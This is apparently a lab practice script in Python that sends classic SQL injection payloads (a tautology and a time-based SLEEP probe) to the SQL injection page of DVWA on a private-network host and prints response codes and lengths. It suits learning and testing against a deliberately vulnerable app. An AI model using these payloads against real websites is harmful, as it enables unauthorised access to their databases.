import requests

target = "http://192.168.75.131/dvwa/vulnerabilities/sqli/"
cookies = {
    "security": "low",
    "PHPSESSID": "YOURSESSIONID"
}

payloads = [
    "1",
    "1' OR '1'='1",
    "1' AND SLEEP(2)#"
]

for payload in payloads:
    params = {"id": payload, "Submit": "Submit"}
    r = requests.get(target, params=params, cookies=cookies)
    print("=" * 60)
    print("Payload:", payload)
    print("Status Code:", r.status_code)
    print("Response Length:", len(r.text))
